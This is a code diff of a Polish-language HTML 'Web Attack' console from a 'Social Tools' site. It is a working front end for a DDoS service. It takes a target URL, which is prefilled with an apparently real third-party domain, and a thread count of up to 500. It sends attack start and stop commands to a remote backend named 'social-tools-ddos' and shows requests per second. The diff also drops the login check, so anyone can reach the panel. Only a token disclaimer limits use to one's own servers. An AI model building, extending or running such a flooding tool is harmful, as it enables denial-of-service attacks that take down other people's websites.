@@ -5,8 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Konsola - Web Attack</title>
     <link rel="icon" href="https://github.com/M1DES1/social-tools/raw/refs/heads/main/cwel.ico" type="image/x-icon">
-    <link rel="stylesheet" href="style.css">
     <style>
+        /* Twoje style CSS (zachowane dla spójności) */
+        body { background-color: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; }
+        .header { background: #1a1a1a; padding: 15px 50px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
+        .nav-link { color: #aaa; text-decoration: none; margin-left: 20px; transition: 0.3s; }
+        .nav-link:hover { color: #f44336; }
+        
         .attack-container {
             max-width: 700px;
             margin: 30px auto;
@@ -22,32 +27,12 @@
             padding: 20px 25px;
             text-align: center;
         }
-        .attack-header h2 {
-            margin: 0;
-            font-size: 28px;
-            font-weight: 600;
-            letter-spacing: 1px;
-        }
-        .attack-header p {
-            margin: 8px 0 0;
-            opacity: 0.9;
-            font-size: 14px;
-        }
-        .attack-body {
-            padding: 30px;
-        }
-        .input-group {
-            margin-bottom: 25px;
-        }
-        .input-group label {
-            display: block;
-            color: #ccc;
-            margin-bottom: 8px;
-            font-weight: 500;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
+        .attack-header h2 { margin: 0; font-size: 28px; letter-spacing: 1px; }
+        .attack-body { padding: 30px; }
+        
+        .input-group { margin-bottom: 25px; }
+        .input-group label { display: block; color: #ccc; margin-bottom: 8px; font-size: 14px; text-transform: uppercase; }
+        
         .attack-input {
             width: 100%;
             padding: 15px;
@@ -55,17 +40,9 @@
             border: 2px solid #444;
             color: white;
             border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
+            box-sizing: border-box;
         }
-        .attack-input:focus {
-            border-color: #f44336;
-            outline: none;
-            background: #333;
-        }
-        .attack-input::placeholder {
-            color: #666;
-        }
+        
         .threads-control {
             display: flex;
             align-items: center;
@@ -73,127 +50,29 @@
             background: #2d2d2d;
             padding: 10px 15px;
             border-radius: 8px;
-            border: 2px solid #444;
         }
-        .threads-control span {
-            color: #f44336;
-            font-weight: bold;
-            font-size: 18px;
-            min-width: 50px;
-            text-align: center;
-        }
-        .threads-control input {
-            flex: 1;
-            height: 8px;
-            -webkit-appearance: none;
-            background: #444;
-            border-radius: 4px;
-        }
-        .threads-control input::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 22px;
-            height: 22px;
-            background: #f44336;
-            border-radius: 50%;
-            cursor: pointer;
-            border: 2px solid white;
-        }
-        .button-group {
-            display: flex;
-            gap: 15px;
-            margin: 30px 0 20px;
-        }
-        .attack-btn {
-            flex: 2;
-            padding: 18px;
-            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .attack-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(220, 0, 0, 0.4);
-        }
-        .attack-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .stop-btn {
-            flex: 1;
-            padding: 18px;
-            background: #424242;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .stop-btn:hover:not(:disabled) {
-            background: #616161;
-        }
-        .stop-btn:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
-        }
-        .status-panel {
-            background: #2d2d2d;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid #f44336;
-        }
-        .status-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #444;
-        }
-        .status-row:last-child {
-            border-bottom: none;
-            margin-bottom: 0;
-            padding-bottom: 0;
-        }
-        .status-label {
-            color: #aaa;
-            font-weight: 500;
-        }
-        .status-value {
-            color: #f44336;
-            font-weight: 700;
-            font-family: monospace;
-            font-size: 18px;
-        }
+        .threads-control span { color: #f44336; font-weight: bold; min-width: 40px; }
+        .threads-control input { flex: 1; cursor: pointer; }
+
+        .button-group { display: flex; gap: 15px; margin: 30px 0; }
+        .attack-btn { flex: 2; padding: 18px; background: #d32f2f; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .stop-btn { flex: 1; padding: 18px; background: #424242; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        .attack-btn:disabled, .stop-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .status-panel { background: #2d2d2d; border-radius: 8px; padding: 20px; border-left: 4px solid #f44336; margin-bottom: 20px; }
+        .status-row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        .status-value { color: #f44336; font-family: monospace; font-weight: bold; }
+
         .log-panel {
-            background: #1a1a1a;
+            background: #000;
             border-radius: 6px;
             padding: 15px;
-            max-height: 200px;
+            max-height: 180px;
             overflow-y: auto;
             font-family: monospace;
             font-size: 13px;
             color: #0f0;
             border: 1px solid #333;
-        }
-        .log-entry {
-            padding: 4px 0;
-            border-bottom: 1px solid #222;
-        }
-        .log-time {
-            color: #888;
-            margin-right: 10px;
-        }
-        .log-attack {
-            color: #f44336;
         }
         .server-badge {
             background: #2d2d2d;
@@ -202,32 +81,19 @@
             display: inline-block;
             margin-bottom: 15px;
             font-size: 13px;
-            color: #aaa;
         }
-        .server-badge.online {
-            border-left: 3px solid #4caf50;
-        }
-        .server-badge.offline {
-            border-left: 3px solid #f44336;
-        }
-        .warning-note {
-            background: rgba(244, 67, 54, 0.1);
-            border: 1px solid rgba(244, 67, 54, 0.3);
-            border-radius: 8px;
-            padding: 12px 15px;
-            margin-top: 20px;
-            color: #ff8a80;
-            font-size: 13px;
-            text-align: center;
-        }
+        .online { border-left: 3px solid #4caf50; }
+        .offline { border-left: 3px solid #f44336; }
+        .warning-note { color: #ff8a80; font-size: 12px; text-align: center; margin-top: 15px; }
     </style>
 </head>
 <body>
     <header class="header">
         <div class="logo">
-            <h2><a href="index.html" style="color: inherit; text-decoration: none;">Social Tools</a></h2>
+            <h2 style="margin:0"><a href="index.html" style="color: white; text-decoration: none;">Social Tools</a></h2>
         </div>
-        <nav class="nav" id="nav"></nav>
+        <nav class="nav" id="nav">
+            </nav>
     </header>
 
     <div class="attack-container">
@@ -237,326 +103,185 @@
         </div>
         
         <div class="attack-body">
-            <!-- Status serwera -->
             <div id="serverBadge" class="server-badge offline">
-                🔴 Serwer: Sprawdzanie...
+                🔴 Serwer: Łączenie...
             </div>
 
-            <!-- Formularz ataku -->
             <div class="input-group">
                 <label>🎯 CEL ATAKU (URL)</label>
-                <input type="text" id="targetUrl" class="attack-input" 
-                       placeholder="https://example.com" 
-                       value="https://zdalne.szymaniuk.com">
+                <input type="text" id="targetUrl" class="attack-input" placeholder="https://example.com" value="https://zdalne.szymaniuk.com">
             </div>
 
             <div class="input-group">
                 <label>⚡ ILOŚĆ WĄTKÓW (1-500)</label>
                 <div class="threads-control">
-                    <span id="threadsValue">208</span>
-                    <input type="range" id="threadsSlider" min="1" max="500" value="208" step="1">
+                    <span id="threadsValue">200</span>
+                    <input type="range" id="threadsSlider" min="1" max="500" value="200">
                 </div>
             </div>
 
-            <!-- Przyciski -->
             <div class="button-group">
                 <button class="attack-btn" id="startAttackBtn" onclick="startAttack()">🚀 ROZPOCZNIJ ATAK</button>
                 <button class="stop-btn" id="stopAttackBtn" onclick="stopAttack()" disabled>⏹️ STOP</button>
             </div>
 
-            <!-- Panel statusu -->
             <div class="status-panel" id="statusPanel" style="display: none;">
-                <div class="status-row">
-                    <span class="status-label">ID ATAKU:</span>
-                    <span class="status-value" id="attackId">-</span>
-                </div>
-                <div class="status-row">
-                    <span class="status-label">CEL:</span>
-                    <span class="status-value" id="attackTarget">-</span>
-                </div>
-                <div class="status-row">
-                    <span class="status-label">ZAPYTANIA:</span>
-                    <span class="status-value" id="attackRequests">0</span>
-                </div>
-                <div class="status-row">
-                    <span class="status-label">CZAS:</span>
-                    <span class="status-value" id="attackTime">0s</span>
-                </div>
-                <div class="status-row">
-                    <span class="status-label">RPS:</span>
-                    <span class="status-value" id="attackRps">0</span>
-                </div>
+                <div class="status-row"><span>ID:</span> <span class="status-value" id="attackId">-</span></div>
+                <div class="status-row"><span>ZAPYTANIA:</span> <span class="status-value" id="attackRequests">0</span></div>
+                <div class="status-row"><span>CZAS:</span> <span class="status-value" id="attackTime">0s</span></div>
+                <div class="status-row"><span>RPS (Siła):</span> <span class="status-value" id="attackRps">0</span></div>
             </div>
 
-            <!-- Logi -->
             <div class="log-panel" id="logPanel">
-                <div class="log-entry"><span class="log-time">⏰</span> System gotowy. Wprowadź URL i rozpocznij atak.</div>
+                <div>[SYSTEM] Inicjalizacja...</div>
             </div>
 
             <div class="warning-note">
-                ⚠️ TYLKO DO TESTÓW WŁASNYCH SERWERÓW! Nie atakuj cudzych stron bez zgody.
+                ⚠️ TYLKO DO TESTÓW WŁASNYCH! Nie atakuj stron bez zgody właściciela.
             </div>
         </div>
     </div>
 
     <script>
-        // === KONFIGURACJA – ADRES SERWERA PYTHON ===
+        // === KONFIGURACJA ===
         const API_BASE_URL = 'https://social-tools-ddos.onrender.com';
         const API_URL = API_BASE_URL + '/api';
 
         let currentAttackId = null;
         let statusInterval = null;
-        let attackStartTime = null;
 
-        // Sprawdzenie czy użytkownik jest zalogowany
-        document.addEventListener('DOMContentLoaded', function() {
-            const currentUser = localStorage.getItem('currentUser');
-            const nav = document.getElementById('nav');
+        // Inicjalizacja przy starcie
+        document.addEventListener('DOMContentLoaded', () => {
+            const currentUser = localStorage.getItem('currentUser') || "Gość";
+            document.getElementById('nav').innerHTML = `
+                <span style="color:#aaa">Witaj, ${currentUser}</span>
+                <a href="#" class="nav-link" onclick="logout()">Wyloguj</a>
+            `;
             
-            if (currentUser) {
-                nav.innerHTML = `
-                    <span class="welcome-text">Witaj, ${currentUser}!</span>
-                    <a href="index.html" class="nav-link">Strona główna</a>
-                    <a href="#" class="nav-link" onclick="logout()">Wyloguj</a>
-                `;
-                checkServerStatus();
-            } else {
-                window.location.href = 'login.html';
-            }
+            checkServerStatus();
+            // Sprawdzaj status co 15 sekund
+            setInterval(checkServerStatus, 15000);
         });
 
-        // Obsługa suwaka wątków
-        const threadsSlider = document.getElementById('threadsSlider');
-        const threadsValue = document.getElementById('threadsValue');
-        
-        threadsSlider.addEventListener('input', function() {
-            threadsValue.textContent = this.value;
-        });
+        // Obsługa suwaka
+        const slider = document.getElementById('threadsSlider');
+        slider.oninput = function() { document.getElementById('threadsValue').innerHTML = this.value; }
 
-        // Sprawdzenie statusu serwera
+        // 1. Sprawdzanie czy serwer żyje
         async function checkServerStatus() {
             const badge = document.getElementById('serverBadge');
-            
             try {
-                const response = await fetch(`${API_BASE_URL}`, {
-                    method: 'GET',
-                    headers: { 'Content-Type': 'application/json' }
-                });
+                // Uderzamy w endpoint /api/status z Twojego Pythona
+                const res = await fetch(`${API_URL}/status`);
+                const data = await res.json();
                 
-                if (response.ok) {
-                    const data = await response.json();
+                if (data.success || data.status === "online") {
                     badge.className = 'server-badge online';
-                    badge.innerHTML = `🟢 Serwer: Połączony (${data.name || 'DDoS Server'})`;
-                    addLog('✅ Połączono z serwerem DDoS', 'success');
-                } else {
-                    throw new Error('Serwer nie odpowiada');
+                    badge.innerHTML = `🟢 Serwer: Połączony (${data.active_attacks || 0} ataków)`;
                 }
-            } catch (error) {
+            } catch (err) {
                 badge.className = 'server-badge offline';
-                badge.innerHTML = '🔴 Serwer: Brak połączenia';
-                addLog('❌ Błąd połączenia z serwerem DDoS', 'error');
+                badge.innerHTML = '🔴 Serwer: Offline / Budzenie (poczekaj 1 min)...';
             }
         }
 
-        // Rozpoczęcie ataku
+        // 2. Start Ataku
         async function startAttack() {
             const url = document.getElementById('targetUrl').value.trim();
             const threads = document.getElementById('threadsSlider').value;
 
-            if (!url) {
-                addLog('❌ Podaj URL celu', 'error');
-                return;
-            }
+            if (!url) return addLog('❌ Błąd: Podaj URL celu!', 'error');
 
-            // Walidacja URL
-            let targetUrl = url;
-            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
-                targetUrl = 'http://' + targetUrl;
-            }
-
-            // Blokuj przyciski
-            document.getElementById('startAttackBtn').disabled = true;
-            document.getElementById('stopAttackBtn').disabled = false;
+            addLog(`🚀 Wysyłanie żądania ataku na: ${url}...`, 'warning');
             
-            addLog(`🚀 Rozpoczynanie ataku na ${targetUrl} (${threads} wątków)...`, 'attack');
+            document.getElementById('startAttackBtn').disabled = true;
 
             try {
-                // === POPRAWIONE: DODANY HEADER CONTENT-TYPE ===
                 const response = await fetch(`${API_URL}/attack/start`, {
                     method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json'  // TO JEST KLUCZOWE!
-                    },
-                    body: JSON.stringify({
-                        url: targetUrl,
-                        threads: parseInt(threads)
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: url, threads: parseInt(threads) })
                 });
-
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    throw new Error(`HTTP ${response.status}: ${errorText.substring(0, 100)}`);
-                }
 
                 const data = await response.json();
 
                 if (data.success) {
                     currentAttackId = data.attack_id;
-                    attackStartTime = Date.now();
-                    
-                    // Pokaż panel statusu
                     document.getElementById('statusPanel').style.display = 'block';
-                    document.getElementById('attackId').textContent = data.attack_id;
-                    document.getElementById('attackTarget').textContent = targetUrl;
+                    document.getElementById('attackId').textContent = currentAttackId;
+                    document.getElementById('stopAttackBtn').disabled = false;
                     
-                    addLog(`✅ Atak rozpoczęty! ID: ${data.attack_id}`, 'success');
+                    addLog(`✅ Atak ruszył! ID: ${currentAttackId}`, 'success');
                     
-                    // Rozpocznij odświeżanie statusu
                     if (statusInterval) clearInterval(statusInterval);
-                    statusInterval = setInterval(updateAttackStatus, 1000);
+                    statusInterval = setInterval(updateStats, 2000);
                 } else {
-                    addLog(`❌ Błąd: ${data.error || 'Nieznany błąd'}`, 'error');
-                    resetButtons();
+                    throw new Error(data.error || "Błąd serwera");
                 }
-            } catch (error) {
-                addLog(`❌ Błąd połączenia: ${error.message}`, 'error');
-                resetButtons();
+            } catch (err) {
+                addLog(`❌ Błąd: ${err.message}. Sprawdź czy backend na Render działa!`, 'error');
+                document.getElementById('startAttackBtn').disabled = false;
             }
         }
 
-        // Zatrzymanie ataku
+        // 3. Stop Ataku
         async function stopAttack() {
-            if (!currentAttackId) {
-                resetButtons();
-                return;
-            }
-
-            addLog('⏹️ Zatrzymywanie ataku...', 'warning');
-
+            if (!currentAttackId) return;
+            
+            addLog('⏹️ Zatrzymywanie...', 'warning');
             try {
-                const response = await fetch(`${API_URL}/attack/stop/${currentAttackId}`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json' 
-                    }
-                });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-
-                const data = await response.json();
-
-                if (data.success) {
-                    addLog('✅ Atak zatrzymany', 'success');
-                } else {
-                    addLog(`❌ Błąd: ${data.error || 'Nieznany błąd'}`, 'error');
-                }
-            } catch (error) {
-                addLog(`❌ Błąd: ${error.message}`, 'error');
-            }
-
-            // Czyść interwał i resetuj
-            if (statusInterval) {
-                clearInterval(statusInterval);
-                statusInterval = null;
+                await fetch(`${API_URL}/attack/stop/${currentAttackId}`, { method: 'POST' });
+                addLog('✅ Atak zatrzymany pomyślnie.', 'success');
+            } catch (err) {
+                addLog('⚠️ Problem z zatrzymaniem, ale serwer pewnie już ubił proces.', 'error');
             }
             
+            finishAttack();
+        }
+
+        function finishAttack() {
+            clearInterval(statusInterval);
             currentAttackId = null;
-            resetButtons();
-        }
-
-        // Aktualizacja statusu ataku
-        async function updateAttackStatus() {
-            if (!currentAttackId) return;
-
-            try {
-                const response = await fetch(`${API_URL}/attack/status/${currentAttackId}`, {
-                    headers: { 
-                        'Content-Type': 'application/json' 
-                    }
-                });
-                
-                if (!response.ok) {
-                    if (response.status === 404) {
-                        // Atak już nie istnieje - zatrzymaj odświeżanie
-                        if (statusInterval) {
-                            clearInterval(statusInterval);
-                            statusInterval = null;
-                        }
-                        addLog('⚠️ Atak zakończony (nie znaleziono)', 'warning');
-                        resetButtons();
-                        return;
-                    }
-                    throw new Error(`HTTP ${response.status}`);
-                }
-
-                const data = await response.json();
-
-                if (data.success) {
-                    const duration = Math.floor(data.duration);
-                    const minutes = Math.floor(duration / 60);
-                    const seconds = duration % 60;
-                    
-                    document.getElementById('attackRequests').textContent = data.requests.toLocaleString();
-                    document.getElementById('attackTime').textContent = `${minutes}m ${seconds}s`;
-                    document.getElementById('attackRps').textContent = Math.round(data.rps);
-
-                    if (!data.active) {
-                        addLog('⚠️ Atak zakończony', 'warning');
-                        if (statusInterval) {
-                            clearInterval(statusInterval);
-                            statusInterval = null;
-                        }
-                        resetButtons();
-                    }
-                }
-            } catch (error) {
-                console.error('Błąd aktualizacji statusu:', error);
-                // Nie zatrzymuj interwału przy błędzie sieciowym - spróbuj ponownie
-            }
-        }
-
-        // Resetowanie przycisków
-        function resetButtons() {
             document.getElementById('startAttackBtn').disabled = false;
             document.getElementById('stopAttackBtn').disabled = true;
         }
 
-        // Dodawanie logów
-        function addLog(message, type = 'info') {
-            const logPanel = document.getElementById('logPanel');
-            const time = new Date().toLocaleTimeString();
-            
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            
-            let color = '#0f0';
-            if (type === 'error') color = '#f44336';
-            if (type === 'warning') color = '#ff9800';
-            if (type === 'attack') color = '#ff4444';
-            if (type === 'success') color = '#4caf50';
-            
-            logEntry.innerHTML = `<span class="log-time">[${time}]</span> <span style="color: ${color}">${message}</span>`;
-            logPanel.appendChild(logEntry);
-            
-            // Przewiń na dół
-            logPanel.scrollTop = logPanel.scrollHeight;
-            
-            // Ogranicz ilość logów
-            if (logPanel.children.length > 50) {
-                logPanel.removeChild(logPanel.children[0]);
+        // 4. Aktualizacja statystyk w czasie rzeczywistym
+        async function updateStats() {
+            if (!currentAttackId) return;
+
+            try {
+                const res = await fetch(`${API_URL}/attack/status/${currentAttackId}`);
+                const data = await res.json();
+
+                if (data.success) {
+                    document.getElementById('attackRequests').textContent = data.requests.toLocaleString();
+                    document.getElementById('attackTime').textContent = Math.round(data.duration) + "s";
+                    document.getElementById('attackRps').textContent = Math.round(data.rps);
+
+                    if (!data.active) {
+                        addLog('ℹ️ Atak zakończył się samoczynnie.', 'info');
+                        finishAttack();
+                    }
+                }
+            } catch (err) {
+                console.log("Status update error");
             }
         }
 
-        // Wylogowanie
-        function logout() {
-            localStorage.removeItem('currentUser');
-            window.location.href = 'index.html';
+        function addLog(msg, type) {
+            const panel = document.getElementById('logPanel');
+            const entry = document.createElement('div');
+            const colors = { error: '#ff4444', success: '#00ff00', warning: '#ffbb33', info: '#0099ff' };
+            entry.innerHTML = `<span style="color: #666">[${new Date().toLocaleTimeString()}]</span> <span style="color: ${colors[type] || '#fff'}">${msg}</span>`;
+            panel.appendChild(entry);
+            panel.scrollTop = panel.scrollHeight;
         }
 
-        // Sprawdzaj status serwera co 30 sekund
-        setInterval(checkServerStatus, 30000);
+        function logout() {
+            localStorage.removeItem('currentUser');
+            window.location.reload();
+        }
     </script>
 </body>
 </html>
